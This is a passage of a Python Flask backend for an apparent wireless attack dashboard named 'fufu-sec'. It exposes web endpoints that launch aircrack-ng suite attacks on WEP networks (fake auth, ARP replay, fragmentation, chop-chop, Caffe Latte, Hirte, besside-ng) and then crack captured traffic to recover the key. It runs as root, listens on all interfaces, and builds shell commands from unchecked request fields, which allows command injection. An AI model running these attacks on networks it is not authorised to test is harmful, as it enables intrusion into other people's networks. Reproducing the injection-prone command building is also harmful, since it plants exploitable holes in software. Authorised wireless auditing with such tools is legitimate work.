        return jsonify({"output":f"[*] {cmd}\n{out or ('Running...' if running else 'Exited')}",
                        "success":"Fake auth running" if running else None,
                        "error":None if running else "Fake auth failed"})
    elif mode == "arp":
        if not bssid: return jsonify({"error": "BSSID required"})
        client_flag = f"-h {client}" if client else ""
        if channel:
            run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
                    f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=5)
        run_bg("wep_cap", f"airodump-ng --bssid {bssid} --channel {channel} -w {output} --output-format pcap,csv {iface}")
        time.sleep(1.5)
        run_bg("wep_arp", f"aireplay-ng -3 -b {bssid} {client_flag} {iface}")
        return jsonify({"output":f"[*] Channel locked to {channel}\n[*] Capture: {output}-01.cap\n[*] ARP replay started\n[*] Wait 50k+ IVs then crack",
                        "success":"ARP replay running","cap_file":output+"-01.cap"})
    elif mode == "frag":
        if not bssid: return jsonify({"error": "BSSID required"})
        if channel:
            run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
                    f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=5)
        proc = run_bg("wep_frag", f"aireplay-ng -5 -b {bssid} {('-h '+client) if client else ''} {iface}")
        time.sleep(1.5); running = proc.poll() is None
        return jsonify({"output": f"[*] aireplay-ng -5 fragmentation attack running\n[*] Watch for: Got a frame (WEP)\n[*] It will write a .xor keystream file when successful",
                        "success": "Fragmentation attack running" if running else None,
                        "error": None if running else "aireplay-ng -5 exited — check injection support"})
    elif mode == "chopchop":
        if not bssid: return jsonify({"error": "BSSID required"})
        if channel:
            run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
                    f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=5)
        proc = run_bg("wep_chopchop", f"aireplay-ng -4 -b {bssid} {('-h '+client) if client else ''} {iface}")
        time.sleep(1.5); running = proc.poll() is None
        return jsonify({"output": f"[*] aireplay-ng -4 chop-chop attack running\n[*] Waiting for WEP data frame from AP\n[*] Will produce a .xor keystream when successful",
                        "success": "Chop-Chop attack running" if running else None,
                        "error": None if running else "aireplay-ng -4 exited — check injection support"})
    elif mode == "caffe":
        if not client: return jsonify({"error": "Client MAC required"})
        proc = run_bg("wep_caffe", f"aireplay-ng -6 -D -b {bssid or 'FF:FF:FF:FF:FF:FF'} -h {client} {iface}")
        return jsonify({"output": read_output(proc, timeout=15) or "Running...", "success": "Caffe Latte running"})
    elif mode == "hirte":
        if not client: return jsonify({"error": "Client MAC required"})
        proc = run_bg("wep_hirte", f"aireplay-ng -8 -d {client} {iface}")
        return jsonify({"output": read_output(proc, timeout=15) or "Running...", "success": "Hirte running"})
    elif mode == "besside":
        if not tool_exists("besside-ng"): return jsonify({"error": "besside-ng not installed"})
        target_flag = f"-b {data.get('besside_target','')}" if data.get("besside_target") else ""
        cmd = f"besside-ng {target_flag} {('-c '+channel) if channel else ''} {iface}"
        run_bg("wep_besside", cmd)
        return jsonify({"output": f"[*] {cmd}", "success": "Besside-ng running"})
    return jsonify({"error": f"Unknown WEP mode: {mode}"})


@app.route("/api/wep/stop", methods=["POST"])
def wep_stop():
    data = request.json or {}; mode = data.get("mode","all")
    key_map = {"arp":["wep_arp","wep_cap"],"fakeauth":["wep_fakeauth"],"frag":["wep_frag"],
               "chopchop":["wep_chopchop"],"caffe":["wep_caffe"],"hirte":["wep_hirte"],"besside":["wep_besside"]}
    if mode == "all":
        for keys in key_map.values():
            for k in keys: kill_bg(k)
    else:
        for k in key_map.get(mode,[mode]): kill_bg(k)
    return jsonify({"success": f"WEP {mode} stopped"})


@app.route("/api/wep/crack", methods=["POST"])
def wep_crack():
    data = request.json or {}; capfile = (data.get("capfile") or "").strip(); mode = data.get("mode","")
    if not capfile or not os.path.exists(capfile):
        available = sorted([os.path.join(TMPDIR,f) for f in os.listdir(TMPDIR) if f.endswith(".cap")])
        return jsonify({"error": f"Cap not found: {capfile}. "+("Available: "+", ".join(available) if available else "No cap files")})
    if not _safe_path(capfile, "/tmp/fufu-sec"): return jsonify({"error": "Invalid path"}), 400
    audit("WEP_CRACK", f"cap={capfile}")
    proc = run_bg("aircrack_wep", f"aircrack-ng {mode} '{capfile}' 2>&1")
    output = re.sub(r"\x1b\[[0-9;]*m|\[\d+K", "", read_output(proc, timeout=180))
    key_m = re.search(r"KEY FOUND!.*?\[\s*(.+?)\s*\]", output)
    hex_m = re.search(r"KEY FOUND!.*?\((.+?)\)", output)
    if key_m: audit("WEP_KEY_FOUND", f"cap={capfile} key={key_m.group(1)}")
    return jsonify({"output":output,"key":key_m.group(1) if key_m else None,
                    "key_hex":hex_m.group(1) if hex_m else None,
                    "success":f"WEP KEY FOUND: {key_m.group(1)}" if key_m else None,
                    "error":None if key_m else "Not enough IVs — keep capturing"})


# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse as _ap
    _parser = _ap.ArgumentParser(description="fufu-sec backend")
    _parser.add_argument("--port", type=int, default=5000, help="Port to listen on (default: 5000)")
    _parser.add_argument("--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    _args, _ = _parser.parse_known_args()

    if os.geteuid() != 0:
        print("\n⚠  WARNING: fufu-sec must be run as root for wireless tools to work.")
        print("   Run: sudo python3 server.py\n")

    try:
        from flask_cors import CORS as _check
    except ImportError:
        print("Installing flask and flask-cors...")
        os.system("pip3 install flask flask-cors --break-system-packages -q")

    # Cleanup stale temp files from previous run (TMPDIR = /tmp/fufu-sec/)
    for f in os.listdir(TMPDIR):
        if f in ("bl.txt",) or f.endswith(".pid"):
            try: os.remove(os.path.join(TMPDIR, f))
            except: pass

    print(f"""
╔══════════════════════════════════════════════════╗
║   fufu-sec  · kyllr-qwen                        ║
║   github.com/kyllr-qwen/fufu-sec                ║
║                                                  ║
║   API  →  http://{_args.host}:{_args.port}             ║
║   Open dashboard.html in your browser            ║
╚══════════════════════════════════════════════════╝
""")
    app.run(host=_args.host, port=_args.port, debug=False, threaded=True)
